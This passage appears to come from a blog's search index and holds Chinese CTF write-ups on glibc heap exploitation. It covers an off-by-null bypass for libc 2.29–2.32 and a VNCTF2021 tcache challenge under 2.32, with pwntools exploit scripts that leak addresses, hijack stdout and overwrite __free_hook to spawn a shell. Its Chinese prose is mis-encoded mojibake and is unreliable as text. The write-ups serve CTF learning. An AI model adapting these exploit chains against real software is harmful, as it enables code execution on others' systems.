ä¸ºä¸æ£€æŸ¥sizeä½ï¼Œæ‰€ä»¥ç›´æ¥é‡Šæ”¾æ‰å³å¯ã€‚è¿™é‡Œçš„fake_chunkå·²ç»æ›¿ä»£äº†chunk0çš„ä½œç”¨ï¼Œèƒ½å¤Ÿç»•è¿‡Unlinkçš„æ£€æŸ¥å’Œsizeä½çš„æ£€æŸ¥)\n\n3.æœ€åæ¨¡æ‹Ÿä¸€ä¸‹ä»£ç ï¼ŒåŒæ ·å‚è€ƒäº†å¤§ä½¬[t1an5gçš„åšå®¢](https://bbs.pediy.com/thread-257901-1.htm#msg_header_h2_2)ï¼š\n\n(1)å‰æœŸå‡†å¤‡åŠ å †å¸ƒå±€:\n\n```python\n#æ³¨é‡Šå¤´\n\nfor i in range(7): # 0-6\n    add(0x1000, \"padding\")\nadd(0x1000-0x410, \"padding\") # 7\n\nfor i in range(7): # 8-14\n    add(0x28, 'tcache')\n\n#crux chunk15\nadd(0xb20, \"largebin\") # 15\n\n#prevent merge\nadd(0x10, \"padding\") # 16\n```\n\n(2)åˆ¶ä½œfake_chunkï¼Œåˆ©ç”¨largebinè¸©ä¸‹fd_nextsizeå’Œbk_nextsize:\n\n```python\n#æ³¨é‡Šå¤´\n\ndelete(15)\n\n#chunk15 to largebin\nadd(0x1000, '\\n') \n\n#make fake_chunk in chunk17\nadd(0x28, p64(0) + p64(0x521) + p8(0x40))\n```\n\n(3)è”åŠ¨fastbinå’Œsmallbinï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nadd(0x28, 'a') # 18\nadd(0x28, 'b') # 19\nadd(0x28, 'c') # 20\nadd(0x28, 'd') # 21\n\n# fill in tcache(0x30)\nfor i in range(7): # 8-14\n    delete(8 + i)\n\ndelete(20)\ndelete(18)\n\n# clear tcache(0x30)\nfor i in range(7): # 8-14\n    add(0x28, 'padding')\n\n# fastbin to smallbin\nadd(0x400, 'padding')\n\n# get chunk18 from smallbin ,chunk20 to tcache\n# change chunk18->bk to point to fake_chunk\nadd(0x28, p64(0) + p8(0x20))\n```\n\n(4)åˆ©ç”¨fastbinä¿®æ”¹chunk17->fdï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\n# clear chunk from tcache\nadd(0x28, 'clear') # 20 from tcache\n\nfor i in range(7): # 8-14\n    delete(8 + i)\n\n# free to fastbin\ndelete(19)\ndelete(17)\n\nfor i in range(7): # 8-14\n    add(0x28, '\\n')\n\n# change chunk17->fd to point to fake_chunk\nadd(0x28, p8(0x20))\n```\n\n(5)è§¦å‘off-by-null:\n\n```python\n#æ³¨é‡Šå¤´\n\nadd(0x28, \"clear\")#19 from fastbin\n\nadd(0x28, \"a\") # 22 cutting from chunk15 in unsortebin,for overwrite\nadd(0x5f8, \"a\") # 23 legacy from chunk15 in unsortebin,for trigger off-by-null\nadd(0x100, \"padding\") # 24\n\n# off-by-null \nedit(22, \"a\"*0x20 + p64(0x520))\n\n# trigger\ndelete(23)\n```\n\nâ–³ä»¥ä¸Šçš„chunkç´¢å¼•å¯¹äºé¢˜ç›®å…·ä½“åˆ†æï¼Œä¸åŒé¢˜ç›®å¯¹ç´¢å¼•çš„å¤„ç†è‚¯å®šä¸ä¸€æ ·ã€‚\n\nå…¶å®è¿˜æœ‰å…¶ä»–åªåˆ©ç”¨unsortedbinå’Œlargebinçš„ç»•è¿‡ï¼Œè´´ä¸€ä¸‹åœ°å€ï¼š\n\nhttps://www.anquanke.com/post/id/236078#h3-14\n\nåé¢å†æ¥å•ƒå§ã€‚\n","tags":["off-by-null"],"categories":["PWN","pwnå †-off-by-null"]},{"title":"2.29-2.32ä¸‹çš„off-by-null","url":"/2021/08/14/2.29-2.32ä¸‹çš„off-by-null/","content":"\næœ€è¿‘å‘ç°ä¸€ç§å¯¹äºé«˜ç‰ˆæœ¬libcæ›´å¥½çš„æ–¹æ³•ï¼Œä¸ç”¨çˆ†ç ´ï¼Œå…ˆè´´ä¸‹è¿æ¥ï¼š\n\nhttps://www.anquanke.com/post/id/236078#h3-7\n\nè€Œä¸”è¿™ä¸ªå¯ä»¥è¯´æ˜¯é€šæ€é™¤äº†2.33ç‰ˆæœ¬çš„æ‰€æœ‰Libcï¼Œå› ä¸ºæ²¡ç”¨ç”¨åˆ°tcacheå’Œfastbinï¼Œè¿™ä½å¤§ä½¬WJHå¸ˆå‚…çœŸæ˜¯ç¥ä»™ã€‚ä½†æ˜¯ä»–çš„æœ‰äº›åœ°æ–¹æœ‰ç‚¹å‡ºå…¥ï¼Œåˆšå¼€å§‹è°ƒè¯•çš„æ—¶å€™å®¹æ˜“ç›´æ¥å¹²è’™ï¼Œæ‰€ä»¥è¿™é‡Œæ€»ç»“ä¸€ä¸‹ã€‚\n\nâ–²æ€»çš„æ¥è¯´æ˜¯è¿ç”¨unsortedbinæ¥è¸©åœ°å€ï¼Œç„¶åå†å€Ÿç”¨unsortedbinå’ŒLargebinåŠ ä¸Šoff-by-nullæ¥ä¿®å¤fdï¼Œbkï¼Œä»è€Œèƒ½å¤Ÿé€šè¿‡æ–°å¢çš„æ£€æŸ¥ã€‚è¿™é‡Œæˆ‘æ‹¿\n\nç¬¬ä¸‰å±Šå±±ä¸œæ–°ä¸€ä»£ä¿¡æ¯æŠ€æœ¯åˆ›æ–°åº”ç”¨å¤§èµ› werewolf2ï¼ŒåŸé¢˜æ˜¯2.27çš„ï¼Œè¿™é‡Œç”¨2.31æ¨¡æ‹Ÿä¸€ä¸‹ã€‚\n\nè¿™é“é¢˜æ¥ä¸¾ä¾‹ï¼Œé¢˜ç›®ä¸åŒchunkçš„ç´¢å¼•å¯¹åº”å˜åŒ–ã€‚\n\n1.é¦–å…ˆå †é£æ°´å¸ƒå±€ï¼Œè®©æˆ‘ä»¬ä¹‹åç”³è¯·ç”¨æ¥åˆ©ç”¨çš„chunkçš„åä¸€ä¸ªå­—èŠ‚å¯æ§ï¼Œå°±æ˜¯å¾—ä¸º0x00ï¼Œæ–¹ä¾¿off-by-nullåˆ©ç”¨ã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\nadd(0x1000-0x8-0xf0,'padd')#0\n```\n\nè¿™ä¸ªå †å¸ƒå±€çœ‹å…·ä½“çš„ç¯å¢ƒï¼Œæœ‰çš„é¢˜ä¸Šæ¥å…ˆç”³è¯·ä¸€å †å †å—ï¼Œå®¹æ˜“æè’™ï¼Œdè°ƒä¸€ä¸‹å°±çŸ¥é“äº†ã€‚\n\n2.ç„¶åå‡†å¤‡å †å—ï¼Œç»“åˆä¹‹å‰çš„å †å¸ƒå±€ï¼Œéœ€è¦æ»¡è¶³æ¡ä»¶ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nadd(0x418,'\\x01'*0x410) #1 fd  0x---2b0\nadd(0x108,'\\x02*0x100') #2\nadd(0x418,'\\x03'*0x410) #3\nadd(0x438,'\\x04'*0x430) #4 unlink_chunk  0x---c00\nadd(0x108,'\\x05'*0x100) #5\nadd(0x428,'\\x06'*0x420) #6 bk  0x---150\nadd(0x208,'\\x07'*0x200) #7\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-18-35.png)\n\nå…¶ä¸­0x108å¤§å°çš„å †å—ä¸»è¦æ˜¯è¾…åŠ©åŠ éš”ç¦»ï¼Œç„¶å0x428ä¹‹ç±»çš„å‡ ä¸ªä¸åŒå¤§å°æ˜¯ä¸ºåˆ‡å‰²unsortedbinæ¥æäº‹ã€‚ç„¶åè¿™é‡Œæˆ‘ç”³è¯·äº†0x208å¤§å°çš„å †å—ï¼Œè¿™ä¸ªå †å—çš„ä½œç”¨ä¸»è¦å°±æ˜¯éš”ç¦»å’Œå¡«å……ï¼Œç„¶ååŸè´´çš„å¤§ä½¬ç”±äºsizeä½ç”¨åˆ°äº†\\x0aï¼Œæ˜¯ä¸ªæ¢è¡Œç¬¦ï¼ŒPwnä¸­ä¸€èˆ¬æ¯”éª„æ•æ„Ÿï¼Œå®¹æ˜“æ— æ³•å‘é€ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘å¤šç”³è¯·0x100ï¼Œè®©ä¹‹åçš„sizeä½å˜æˆ\\x0bï¼Œæ–¹ä¾¿åˆ©ç”¨ã€‚\n\n3.ç„¶åå°±å¼€å§‹æäº‹ï¼Œé¦–å…ˆé‡Šæ”¾è¿™å‡ ä¸ªchunkã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\nfree(1)\nfree(4)\nfree(6)\nfree(3)\n```\n\næ»¡è¶³å¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-33-40.png)\n\né‡Šæ”¾é¡ºåºéœ€è¦æ³¨æ„ï¼Œè¦åˆ©ç”¨unsortedbinåœ¨0x---c00è¿™ä¸ªchunkä¸Šç•™ä¸‹0x---2b0å’Œ0x---150çš„åœ°å€ä½œä¸ºfdå’Œbkï¼Œä¹‹åå†ä¿®å¤fd->bkå’Œbk->fdï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-48-19.png)\n\nå…¶ä¸­ä¸¤ä¸ªchunkåˆå¹¶äº†ç»„æˆäº†0x---7e0è¿™ä¸ªchunkï¼Œæ–¹ä¾¿åˆ‡å‰²ä¹‹åä¿®æ”¹0x---c00çš„sizeä½ã€‚\n\n4.ä¹‹åç”³è¯·chunkï¼Œä»0x---7e0ä¸­ç”³è¯·åˆ‡å‰²ï¼Œä¿®æ”¹0x---c00çš„sizeä½ï¼ŒåŒæ—¶ä¼šè§¦å‘malloc_consolidateå°†0x---150å’Œ0x--2b0æ”¾å…¥largebinä¸­ï¼Œè¿™ä¸ªæ²¡å•¥ç”¨ï¼Œç›´æ¥ç”³è¯·å›æ¥å°±å¯ä»¥äº†ï¼Œä¸»è¦æ˜¯åˆ‡å‰²ã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\nadd(0x438, '\\x08'*0x418 + p64(0xb91)) #8 set size\nadd(0x418,'\\x09'*0x410) # 9     0x---c20\nadd(0x428,'\\x10'*0x420) # 10 bk 0x---150\nadd(0x418,'\\x11'*0x410) # 11 fd 0x---2b0\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_22-42-30.png)\n\n5.ä¹‹åå°±å¼€å§‹ä¿®å¤fdå’Œbkï¼Œåˆ©ç”¨0x---c20å’Œå¯¹åº”çš„fd,bkï¼Œè¿›å…¥unsortedbinæ¥ä¿®å¤ã€‚\n\n(1)ä¿®å¤fd:\n\nå…ˆé‡Šæ”¾0x---2b0ï¼Œç„¶åé‡Šæ”¾0x---c20ï¼Œåˆ©ç”¨unsortedbinæ¥ç»™0x---2b0çš„bkè¸©ä¸Š0x---c20çš„åœ°å€ï¼Œç„¶åç”³è¯·å›æ¥ï¼Œæ–¹ä¾¿ä¹‹åä¿®å¤bk(0x---150)ï¼ŒåŒæ—¶å°†è¸©ä¸‹çš„åœ°å€ä»0x---c20ä¿®æ”¹ä¸º0x---c00ï¼Œå³å¯ä¿®å¤æˆåŠŸã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\nfree(11)  #0x---2b0\nfree(9)   #0x---c20\nadd(0x418, 'PIG007nb')  # 12 0x---c20 to overflow \\x00 in fd\nadd(0x418,'\\x13'*0x410) # 13 0x---c20\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-06-10.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-03-45.png)\n\n(2)ä¿®å¤bkï¼šé¦–å…ˆè¿›å…¥Unsortedbinä¸­è¸©åœ°å€\n\n```python\n#æ³¨é‡Šå¤´\n\nfree(13)\nfree(10)\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-43-09.png)\n\næ²¡å•¥é—®é¢˜ ï¼Œä½†æ˜¯ç”³è¯·å›æ¥çš„æ—¶å€™æœ‰ç‚¹å¤§é—®é¢˜ï¼š\n\nâ‘ å¦‚æœå…ˆç”³è¯·0x---c20ï¼Œé‚£ä¹ˆå°±ä¼šä½¿å¾—unsortedbinä¸­é¡ºåºå˜ä¸ºï¼š\n\n0x---150 -> main_arena+96ï¼Œå¯¼è‡´åŸå…ˆçš„0x---150.fdè¢«ä¿®æ”¹ï¼Œæ— æ³•å®Œæˆä¿®å¤ã€‚\n\nâ‘¡å¦‚æœå…ˆç”³è¯·0x---150ï¼Œé‚£ä¹ˆç”±äºunsortedbinæœºåˆ¶ï¼Œä¾æ®fdéå†ï¼Œå°±ä¼šå…ˆéå†åˆ°0x---c20ï¼Œå¯¼è‡´0x---c20è§£é“¾æ”¾å…¥largebinä¸­ï¼Œunsortedbinä¸­çš„æƒ…å†µå’Œå…ˆç”³è¯·0x---c20æ˜¯ä¸€æ ·çš„ï¼Œå…ˆå˜æˆ0x---150 -> main_arena+96ï¼Œç„¶åæ‰ä¼šè¿”å›0x---150ï¼Œfdéƒ½ä¼šè¢«æ”¹ã€‚\n\nâ–²æ‰€ä»¥å…ˆå°†è¿™ä¸¤ä¸ªchunkæ”¾å…¥largebinä¸­ï¼Œä¾æ®largebinçš„æœºåˆ¶ï¼Œç”±äºè¿™ä¸¤ä¸ªchunkçš„å¤§å°ä¸åŒï¼Œç›´æ¥ç”³è¯·å¯¹åº”å¤§å°å°±èƒ½å¾—åˆ°å¯¹åº”çš„chunkï¼ŒåŒæ—¶ç”±äºlargebinæ’åˆ—ä¾æ®ä»å¤§åˆ°å°ï¼Œç”³è¯·æ—¶ä¹Ÿæ˜¯å…ˆéå†å¤§å°å†éå†fdï¼Œå¦‚æœæ‰€éœ€å¤§å°çš„é“¾ä¸­åªæœ‰è¯¥chunkï¼Œç›´æ¥è¿”å›ã€‚æ‰€ä»¥å°±å¯ä»¥ç”³è¯·ä¸€ä¸ªå¤§chunkï¼Œå°†è¿™ä¸¤ä¸ªchunkéƒ½æ”¾å…¥largebinä¸­ï¼Œé¡ºåºä¸ºï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nadd(0x9F8,'\\x14') # 14 chunk into largebin\n```\n\nåŒæ—¶è¿™ä¸ªå¤§chunkä¹Ÿæ˜¯ä¹‹åéœ€è¦è§¦å‘çš„off-by-nullçš„chunk\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-52-36.png)\n\nä¹‹åå†ç”³è¯·0x---150å¤§å°çš„chunkå°±èƒ½ç›´æ¥å¾—åˆ°äº†ï¼Œç°åœ¨å°±ä¿®å¤å®Œfdå’Œbkäº†ã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\nadd(0x428, '') # 15 partial overwrite fd\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-56-22.png)\n\n6.æœ€åç”¨off-by-nullæ¥è®¾ç½®è§¦å‘chunkçš„sizeä½\n\n```python\n#æ³¨é‡Šå¤´\n\nedit(7,'\\x77'*0x200+p64(0xb90))\nfree(14)\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_00-00-08.png)\n\næ»¡è¶³æ‰€æœ‰æ¡ä»¶ï¼Œé‡Šæ”¾\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_00-00-27.png)\n\nå¯ä»¥çœ‹åˆ°top_chunkå·²ç»å‘ä¸Šåˆå¹¶åˆ°0x---c00äº†ï¼Œä¹‹åå°±å…·ä½“çš„å…·ä½“åˆ†æå°±å®Œäº‹äº†ã€‚\n\nâ–²æœ€åè´´ä¸ªç®€å•çš„expï¼Œåªæ˜¯å¸ƒå±€çš„ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\nadd(0x1000-0x8-0xf0,'padd')#0\n\nadd(0x418,'\\x01'*0x410) #1 fd 0x---2b0\nadd(0x108,'\\x02*0x100') #2\nadd(0x418,'\\x03'*0x410) #3\nadd(0x438,'\\x04'*0x430) #4 unlink_chunk 0x---c00\nadd(0x108,'\\x05'*0x100) #5\nadd(0x428,'\\x06'*0x420) #6 bk 0x---150\nadd(0x208,'\\x07'*0x200) #7\n\n#left fd bk in 0x---c00\nfree(1)\nfree(4)\nfree(6)\n\n#merge and carve to get 0x---c20 and change size which in 0x---c00 \nfree(3)\nadd(0x438, '\\x08'*0x418 + p64(0xb91)) #8 set size\n\n#reply\nadd(0x418,'\\x09'*0x410) # 9 0x---c20\nadd(0x428,'\\x10'*0x420) # 10 bk 0x---150\nadd(0x418,'\\x11'*0x410) # 11 fd 0x---2b0\n\n#repair fd\nfree(11) #0x---2b0\nfree(9) #0x---c20\nadd(0x418, 'PIG007nb') # 12 0x---2b0 to overflow \\x00 in fd\nadd(0x418,'\\x13'*0x410) # 13 0x---c20\n\n\n#repair bk\nfree(13)\nfree(10)\nadd(0x9F8,'\\x14'*0x9f0) # let 0x---150 0x---c20 into largebin\nadd(0x428, '') # 15 0x---150 to overflow \\x00 in fd\n\n#trigger off-by-null\n#add(0x418,'\\x16'*0x410) # 16 c20\nedit(7,'\\x77'*0x200+p64(0xb90))\nfree(14)\n```\n\n \n","tags":["off-by-null"],"categories":["PWN","pwnå †-off-by-null"]},{"title":"2.32ä¸‹çš„tcacheåˆ©ç”¨-VNCTF2021 ff","url":"/2021/08/14/2.32ä¸‹çš„tcacheåˆ©ç”¨-VNCTF2021 ff/","content":"\né€šè¿‡è¿™é¢˜å­¦ä¹ ä¸‹2.32ä¸‹çš„tcacheï¼ŒåŒæ—¶è¿˜å­¦åˆ°å¥½å¤šä¸œè¥¿ã€‚\n\n1.å…ˆè§£æä¸‹é¢˜ç›®ï¼Œå¤§æ¦‚æ˜¯æä¾›äº†åˆ†é…ã€é‡Šæ”¾ã€ç¼–è¾‘ã€æ‰“å°å †å—çš„åŠŸèƒ½ï¼Œä¸è¿‡é™åˆ¶äº†åªèƒ½æ‰“å°ä¸€æ¬¡ã€ç¼–è¾‘ä¸¤æ¬¡ï¼ŒåŒæ—¶è¿˜é™åˆ¶äº†ä¸èƒ½åˆ†é…0x90åŠä»¥ä¸Šçš„å †å—ã€‚ç„¶åé‡Šæ”¾åŠŸèƒ½æŒ‡é’ˆæ²¡æ¸…ç©ºï¼Œæœ‰UAFï¼Œä¿æŠ¤å…¨å¼€ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsJXQhGvoTieV14xa.png)\n\n2.é¦–å…ˆæ³„éœ²åœ°å€ï¼šå› ä¸º2.32è¦åˆ©ç”¨doble-freeå¿…é¡»æ³„éœ²å †åœ°å€ï¼Œæ‰€ä»¥show()åŠŸèƒ½è‚¯å®šå…ˆè¢«ç”¨æ‰ï¼Œç›´æ¥ä»freeçš„chunkçš„fdæŒ‡é’ˆæ³„éœ²å‡ºheap_baseï¼Œå› ä¸º2.32çš„safe-linkingå¼‚æˆ–æœºåˆ¶å°±æ˜¯ä¸‹ä¸€ä¸ªchunkå’Œheap_baseå¼‚æˆ–æ”¾å…¥fdã€‚\n\né‚£ä¹ˆå°±æ€è€ƒä¹‹åæ€ä¹ˆæ³„éœ²Libcåœ°å€ï¼Œå¯ä»¥é€šè¿‡åŠ«æŒIOæ¥æ³„éœ²ï¼Œä½†æ˜¯åŠ«æŒIOä¹Ÿéœ€è¦libcåœ°å€æ‰è¡Œå•Šï¼Œè¿™é‡Œå°±ç”¨åˆ°çˆ†ç ´ï¼Œåˆ©ç”¨unsortebinæ¥ç•™ä¸‹åœ°å€åœ¨tcacheç»“æ„ä½“ä¸Šï¼Œç„¶åéƒ¨åˆ†å†™2ä¸ªå­—èŠ‚æ¥çˆ†ç ´åŠä¸ªå­—èŠ‚ã€‚å› ä¸ºIOå’Œmain_arenaå…¶å®ç›¸è·ä¸æ˜¯å¤ªè¿œï¼Œè°ƒè¯•å°±å¯ä»¥çŸ¥é“ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_17-01-47.png)\n\n```python\n#æ³¨é‡Šå¤´\n\n#leak heap_base\nnew(0x80,'PIG007NB')\nfree()\nshow()\nheap_leak = u64(rc(5).ljust(8,'\\x00'))\nheap_base = heap_leak*0x1000\nlog.info(\"heap_base:0x%x\"%heap_base)\n\n#change key to make double free\nedit('PIG007NBPIG007NB')\nfree()\n\n#change 0x290(7) to free tcache(0x290) into unsortedbin\nedit(p64((heap_leak) ^ (heap_base + 0x10)))\nnew(0x80, 'PIG007NB')\nnew(0x80, '\\x00\\x00' *((0x290-0x20)/0x10) + '\\x07\\x00')\nfree()\n#--------------------------------------------\nnew(0x88, ('\\x00\\x00' + '\\x00\\x00' + '\\x02\\x00' + '\\x00\\x00' + '\\x00\\x00' * 2 + '\\x01\\x00').ljust(0x88, '\\x00'))\n#--------------------------------------------\n```\n\nè¢«#---------------------------åŒ…è£¹èµ·æ¥çš„éƒ¨åˆ†ï¼Œè¿™é‡Œåªèƒ½ç”³è¯·0x48æˆ–è€…0x88å¤§å°çš„ï¼Œå› ä¸ºtcacheç»“æ„ä½“è¢«ç ´åï¼Œå¾ˆå¤šbinçš„æ•°é‡å˜å¤§äº†ï¼Œä¸å†æ˜¯0x0ï¼Œä½†æ˜¯tcacheä¸­å¯¹åº”çš„Biné“¾è¡¨ä¸­ä»ç„¶æ˜¯0x0ï¼Œå†ç”³è¯·å¯¹åº”å¤§å°çš„å°±ä¼šè§¦å‘ç¨‹åºå¼‚å¸¸ï¼Œå…¶å®å°±æ˜¯æ”¾å…¥tcacheç©ºé—²biné“¾è¡¨çš„æ—¶å€™é”™è¯¯ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_17-31-09.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_17-31-31.png)\n\n3.ç„¶åå°±æ˜¯åŠ«æŒIOæ³„éœ²åœ°å€:\n\n```python\n#æ³¨é‡Šå¤´\n\nnew(0x18,p64(heap_base+0x330)+'\\xbb') #will be used later\nnew(0x18,p16(0x66c0))\nnew(0x78,p64(0xfbad1800) + p64(0)*3 + p64(heap_base+0xa8)+p64(heap_base+0xb0)+p64(heap_base+0xb0))\n\n#new(0x78,p64(0xfbad1800) + p64(0)*3 + b'\\x00')\n#this will be OK\nmain_arena = u64(p.recvuntil('1.add')[-13:-7].ljust(8,b'\\x00')) - 0xbb - 96\ntest = main_arena>>40\nlog.info(\"main_arena:0x%x\"%main_arena)\nlog.info(\"test:0x%x\"%test)\nif(test != 0x7f):\n    return\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nlibc_base = malloc_hook-obj.dump('__malloc_hook')\n#stdout_addr = u64(p.recvuntil('1.add')[-13:-7].ljust(8,b'\\x00'))-132\n# log.info(\"stdout_addr:0x%x\"%stdout_addr)\n# obj = LibcSearcher(\"_IO_2_1_stdout_\", stdout_addr)\n# libc_base = stdout_addr-obj.dump('_IO_2_1_stdout_')\n\nsystem_addr = libc_base + obj.dump(\"system\")\n__free_hook_addr = libc_base + obj.dump(\"__free_hook\")\n\nlog.info(\"libc_base:0x%x\"%libc_base)\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"__free_hook_addr:0x%x\"%__free_hook_addr)\n```\n\n4.æœ€åå°±æ˜¯å¡«å……ï¼Œå°†unsortedbinç”³è¯·å®Œä¹‹åï¼Œå°†unsortedbinä»Tcacheçš„ç»“æ„ä½“ä¸­è„±ç¦»å‡ºæ¥ï¼Œé˜²æ­¢å†ç”³è¯·çš„æ—¶å€™ä¹±å¥—ã€‚è¿™é‡Œç›´æ¥ä»topchunkç”³è¯·ï¼Œå®‰å…¨ä¸€ç‚¹ã€‚\n\n```python\n#æ³¨é‡Šå¤´\n\nnew(0x58,'PIG007NB')\nnew(0x58,'PIG007NB')\nnew(0x58,'PIG007NB')\nnew(0x58,'PIG007NB')\nnew(0x18,'PIG007NB')\nnew(0x18,'PIG007NB')\n\n\n#one_gadget = libc_base + 0xdf54c\nnew(0x88, p64(__free_hook_addr^(heap_base/0x1000)))\nnew(0x38, p64(system_addr))\nnew(0x38, p64(system_addr))\n\nnew(0x10, b'/bin/sh\\x00')\npause()\nfree()\np.interactive()\n```\n\n5.æœ€åè´´ä¸ªçˆ†ç ´çš„expï¼Œæœ‰äº›å€Ÿé‰´äº†arttnba3å¸ˆå‚…çš„ï¼š\n\nhttps://arttnba3.cn/2021/05/10/NOTE-0X04-GLIBC_HEAP-EXPLOIT/\n\n```python\n#æ³¨é‡Šå¤´\n\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./pwn\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"libc_base:0x%x\"%libc_base)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so  \n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    #p = process(binary)\n    p = process(['/home/hacker/glibc/2.32/glibc-2.32_build/elf/ld.so', './pwn'], env={\"LD_PRELOAD\":\"/home/hacker/glibc/2.32/glibc-2.32_build/libc.so.6\"})\n    #p = process(['./ld-2.32.so', './pwn'], env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \n\n\n\ndef cmd(command):\n    p.recvuntil(b\">>\")\n    p.sendline(str(command).encode())\n\ndef new(size, content):\n    cmd(1)\n    p.recvuntil(b\"Size:\")\n    p.sendline(str(size).encode())\n    p.recvuntil(b\"Content:\")\n    p.send(content)\n\ndef free():\n    cmd(2)\n\ndef show():\n    cmd(3)\n\ndef edit(content):\n    cmd(5)\n    p.recvuntil(b\"Content:\")\n    p.send(content)\n\ndef exp():\n\n    #leak heap_base\n    new(0x80,'PIG007NB')\n    free()\n    show()\n    heap_leak = u64(rc(5).ljust(8,'\\x00'))\n    heap_base = heap_leak*0x1000\n    log.info(\"heap_base:0x%x\"%heap_base)\n\n    #change key to make double free\n    edit('PIG007NBPIG007NB')\n    free()\n\n    #change 0x290(7) to free tcache(0x290) into unsortedbin\n    edit(p64((heap_leak) ^ (heap_base + 0x10)))\n    new(0x80, 'PIG007NB')\n    new(0x80, '\\x00\\x00' *((0x290-0x20)/0x10) + '\\x07\\x00')\n    free()\n    #--------------------------------------------\n    new(0x88, ('\\x00\\x00' + '\\x00\\x00' + '\\x02\\x00' + '\\x00\\x00' + '\\x00\\x00' * 2 + '\\x01\\x00').ljust(0x88, '\\x00'))\n    #--------------------------------------------\n    \n    \n    new(0x18,p64(heap_base+0x330)+'\\xbb') #will be used later\n    new(0x18,p16(0x66c0))\n    new(0x78,p64(0xfbad1800) + p64(0)*3 + p64(heap_base+0xa8)+p64(heap_base+0xb0)+p64(heap_base+0xb0))\n\n    #new(0x78,p64(0xfbad1800) + p64(0)*3 + b'\\x00')\n    #this will be OK\n    main_arena = u64(p.recvuntil('1.add')[-13:-7].ljust(8,b'\\x00')) - 0xbb - 96\n    test = main_arena>>40\n    log.info(\"main_arena:0x%x\"%main_arena)\n    log.info(\"test:0x%x\"%test)\n    if(test != 0x7f):\n        return\n    malloc_hook = main_arena-0x10\n    obj = LibcSearcher(\"__malloc_hook\", malloc_hook)\n    libc_base = malloc_hook-obj.dump('__malloc_hook')\n    #stdout_addr = u64(p.recvuntil('1.add')[-13:-7].ljust(8,b'\\x00'))-132\n    # log.info(\"stdout_addr:0x%x\"%stdout_addr)\n    # obj = LibcSearcher(\"_IO_2_1_stdout_\", stdout_addr)\n    # libc_base = stdout_addr-obj.dump('_IO_2_1_stdout_')\n\n    system_addr = libc_base + obj.dump(\"system\")\n    __free_hook_addr = libc_base + obj.dump(\"__free_hook\")\n\n    